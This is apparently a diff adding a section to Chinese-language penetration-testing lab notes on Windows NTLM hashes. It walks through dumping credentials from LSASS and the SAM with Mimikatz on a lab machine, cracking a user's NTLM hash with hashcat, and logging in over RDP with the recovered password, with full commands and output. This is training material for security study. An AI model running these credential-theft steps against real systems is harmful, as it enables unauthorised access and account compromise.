@@ -3815,3 +3815,349 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 > Umbrella137!
+
+## Working with Password Hashes
+在現實 PT 中， 可以透過 [pass-the-hash](https://en.wikipedia.org/wiki/Pass_the_hash) 或 [relay attacks](https://en.wikipedia.org/wiki/Relay_attack) 等攻擊，建立和攔截 Windows 網路驗證請求
+
+>[!Important]
+>- **[NTLM（NT LAN Manager)](https://en.wikipedia.org/wiki/NTLM)**:
+>Windows 驗證協議，主要用來對用戶進行身份驗證。NTLM 使用 Challenge-Response 機制，並以 MD4 或 HMAC-MD5 來計算 Hash。
+>- **[Net-NTLMv2（NTLM Challenge-Response Authentication)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3)**:
+>Windows 用於網路身份驗證的 Challenge-Response 機制，常見於 SMB、LDAP、HTTP 等協議。與 NTLM（本地儲存的 hash） 不同，Net-NTLMv2 主要用於網路傳輸中的身份驗證，因此更容易被攔截和攻擊。 ([Net-NTLMv1 參考](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5))
+
+### NTLM vs. Net-NTLMv2
+_ | NTLM | Net-NTLMv2 |
+:------:|:---------------------|:---------------------|
+用途| 本地儲存的 password hash | 網路驗證機制
+儲存路徑 | `SAM` / `NTDS.dit` (Local) | 登入 Windows 服務時傳輸
+Hash format | `Username`:`RID`:`LM Hash`:`NTLM Hash`::: | `User`::`Domain`:`ServerChallenge`:`NT Proof`:`ClientResponse`
+Hash example | Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::|User::Domain:1122334455667788:8877665544332211AABBCCDDEEFF1122:0102030405060708090A0B0C0D0E0F1011121314151617181920212223242526
+破解方式 | 彩虹表、暴力破解 | 中間人攻擊、離線破解
+
+### Cracking NTLM
+Windows 將使用者的 password hash 儲存在 [Security Account Manager](https://en.wikipedia.org/wiki/Security_Account_Manager) (SAM) 資料庫中，用於驗證本機或遠端使用者。
+
+>[!Tip]
+> Microsoft 在 Windows NT 4.0 SP3 引入 SYSKEY 來部分加密 SAM 檔案，防止離線密碼攻擊。Windows 會以 [LAN Manager](https://en.wikipedia.org/wiki/LAN_Manager)（LM） 或 NTLM 格式儲存密碼。
+> - LM（基於 DES）：安全性弱，密碼不區分大小寫，最長 14 字元，超過 7 字元會分成兩段分別加密。
+> - NTLM：較安全的 hash 格式，取代 LM。
+>
+>自 Windows Vista / Server 2008 起，LM 預設已禁用。
+
+NTLM hashes 儲存在 SAM database ， 解決了 LM 的弱點，但是 NTLM hash 仍未加鹽。
+
+>[!Note]
+> [Salts](https://en.wikipedia.org/wiki/Salt_(cryptography)) 是在密碼雜湊前隨機加入值，為了防止 attacker 使用Rainbow Table 來反推密碼 (Rainbow Table Attack)。
+
+在 Windows 中，使用者無法在 `C:\Windows\system32\config\sam` 任意複製、重新命名或移動 SAM database\
+🥚 我們可以使用 [Mimikatz](https://github.com/gentilkiwi/mimikatz) tool 繞過這個限制
+
+>[!Important]
+> Mimikatz:\
+> 主要用於提取 password, hashes, Kerberos tickets 與 privilege escalation.
+> - Extracting plaintext passwords (from LSASS memory)
+> - Dump NTLM/Net-NTLMv2 Hashes (for offline cracking or lateral movement)
+> - Pass-the-Hash / Pass-the-Ticket attack (login to the target system without a password)
+> - Kerberos ticket operations (Golden Ticket / Silver Ticket)
+> - Privilege escalation (token stealing, SEDebug privileges)
+>
+> Mimikatz 的 `sekurlsa` 模組 可以從 LSASS（Local Security Authority Subsystem Service） process memory 中提取 password hashes。
+>> [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) 是 Windows 內部一個安全流程，負責:
+>> 1. user authentication 使用者身份驗證（處理登入時的密碼驗證）。
+>> 2. password changes 密碼變更管理（確保密碼更新的安全性）。
+>> 3. access token creation 存取權限建立（用於管理使用者權限）。
+
+LSASS permissions and access requirements:
+- SYSTEM privileges:
+LSASS 運行時擁有 SYSTEM 等級的權限，這使得它比具有 Administrator 權限的 process 更強大。因此，要從 LSASS 提取密碼，必須具備相當高的權限。
+- [SeDebugPrivilege](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113) 訪問權限:
+只有在以 Administrator 身分（or higher）執行 Mimikatz 並 啟用SeDebugPrivilege 存取權限時，我們才能提取密碼。
+
+也可以使用 [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) 或 Mimikatz 內建的 token elevation 功能，可以將我們的權限提升到 SYSTEM 帳號
+
+以下範例：\
+#### 1. 先使用 Get-LocalUser 確定系統本地存在哪些 user
+```
+PS C:\Windows\system32> Get-LocalUser
+
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+nelly              True
+offsec             True
+sam                True
+WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
+```
+> 發現存在其他 user: nelly 和 sam
+>> 目標是透過 retrieving and cracking NTLM hash 來取得 nelly 的文本密碼。
+
+#### 2. Mimikatz 查看儲存的系統憑證
+##### 2.1 開啟 mimikatz，檢查 SeDebugPrivilege 權限 (`privilege::debug`)
+```
+PS C:\tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+```
+> `Privilege '20' OK`: 表示當前用戶啟用了 SeDebugPrivilege
+
+##### 2.2 提升到 SYSTEM 使用者權限 (`token::elevate`)
+```
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+660     {0;000003e7} 1 D 41854          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;0027e219} 2 F 4062187     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 4133393     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+```
+> `User name :`: 空白，因為是 SYSTEM 帳戶\
+> SYSTEM 帳戶資訊:\
+> `NT AUTHORITY\SYSTEM`, `S-1-5-18`
+
+##### 2.3 提取明文密碼和密碼雜湊
+透過 Mimikatz 常用指令：
+- `sekurlsa::logonpasswords`
+透過掃描 Windows memory，列出目前登入系統的所有用戶帳號、密碼 hash 及其他認證資料，像是 Kerberos 票證、NTLM 哈希等。但會產生大量的輸出。
+- `lsadump::sam`
+需要有管理員或系統權限(所以上面先使用 `token::elevate` 提權)，這個 command 用來從系統中的 SAM 資料庫中提取本地帳戶的密碼 Hash。
+```
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 2613814 (00000000:0027e236)
+Session           : RemoteInteractive from 2
+User Name         : offsec
+Domain            : MARKETINGWK01
+Logon Server      : MARKETINGWK01
+Logon Time        : 2/13/2025 11:33:29 PM
+SID               : S-1-5-21-4264639230-2296035194-3358247000-1001
+        msv :
+         [00000003] Primary
+         * Username : offsec
+         * Domain   : MARKETINGWK01
+         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
+        tspkg :
+        wdigest :
+         * Username : offsec
+         * Domain   : MARKETINGWK01
+         * Password : (null)
+        kerberos :
+         * Username : offsec
+         * Domain   : MARKETINGWK01
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 2613785 (00000000:0027e219)
+Session           : RemoteInteractive from 2
+User Name         : offsec
+Domain            : MARKETINGWK01
+Logon Server      : MARKETINGWK01
+Logon Time        : 2/13/2025 11:33:29 PM
+SID               : S-1-5-21-4264639230-2296035194-3358247000-1001
+        msv :
+         [00000003] Primary
+         * Username : offsec
+         * Domain   : MARKETINGWK01
+         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
+        tspkg :
+        wdigest :
+         * Username : offsec
+         * Domain   : MARKETINGWK01
+         * Password : (null)
+        kerberos :
+         * Username : offsec
+         * Domain   : MARKETINGWK01
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+...
+
+mimikatz # lsadump::sam
+Domain : MARKETINGWK01
+SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
+Local SID : S-1-5-21-4264639230-2296035194-3358247000
+
+SAMKey : 38e2cdfccc1d5220e001dd7d9b6186b3
+
+RID  : 000001f4 (500)
+User : Administrator
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: c17a032e0528525ad763c0bec3658226
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : f39c5178d64eb4811f0e24caddc71880
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 98c4bca33a76248827ddb6d7f5af7e5cc31742eab603ef34944cc4055052bb28
+      aes128_hmac       (4096) : f4f2779905636ac6d8a3dbcccd3da7ad
+      des_cbc_md5       (4096) : fe76fd5291a4b0d0
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : fe76fd5291a4b0d0
+
+
+RID  : 000003e9 (1001)
+User : offsec
+  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 4afc51d3706e26bc98dc90db9a50826a
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : MARKETINGWK01offsec
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 84ec02ea2dd7eb6df176b7abf418babc44e3b082a787ccebe386141eae88385e
+      aes128_hmac       (4096) : 32d058faeea4ca20356399fcf099fcbd
+      des_cbc_md5       (4096) : c8e60ecb689e1543
+    OldCredentials
+      aes256_hmac       (4096) : 8d6689fa7fb0321706ad1363167429077dcbfa1ad76e74f95ce2f58993c36eff
+      aes128_hmac       (4096) : 0bdfdee532724ecdb9f09b62dca4e2be
+      des_cbc_md5       (4096) : ab3b75862cc1c4b0
+    OlderCredentials
+      aes256_hmac       (4096) : 00df88a3ea2cc3bac58ea0ced5304301dbcdfb7c9440e3bba8fcaf07522a1902
+      aes128_hmac       (4096) : e967183d09db853175ae40e7a57d72ae
+      des_cbc_md5       (4096) : 9da4c20dad25046b
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : MARKETINGWK01offsec
+    Credentials
+      des_cbc_md5       : c8e60ecb689e1543
+    OldCredentials
+      des_cbc_md5       : ab3b75862cc1c4b0
+
+
+RID  : 000003ea (1002)
+User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 5036485b9af540fede9a4d43ab6fdc26
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DESKTOP-6OLBM9Onelly
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
+      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
+      des_cbc_md5       (4096) : 7fd6f702615e0e75
+    OldCredentials
+      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
+      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
+      des_cbc_md5       (4096) : 7fd6f702615e0e75
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : DESKTOP-6OLBM9Onelly
+    Credentials
+      des_cbc_md5       : 7fd6f702615e0e75
+    OldCredentials
+      des_cbc_md5       : 7fd6f702615e0e75
+...
+
+mimikatz #
+```
+> 以上取得 nelly password hash 
+RID  : 000003ea (1002)
+User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+
+#### 3. Hash 爆破
+回到 Kali 進行 Hash 爆破
+```
+┌──(chw㉿CHW)-[~]
+└─$ cat nelly.hash  
+3ae8e5f0ffabb3a627672e1600f1ba10
+ 
+┌──(chw㉿CHW)-[~]
+└─$ hashcat --help | grep -i "ntlm"
+   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
+  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+   1000 | NTLM                                                       | Operating System
+```
+> correct mode: 1000
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+...
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 1104517645
+
+3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
+...
+
+```
+> nicole1
+
+嘗試用 nelly:nicole1 登入 RDP
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:nelly /p:nicole1 /v:192.168.111.210
+```
+![image](https://hackmd.io/_uploads/B1YJiO3FJl.png)
+
+### Passing NTLM
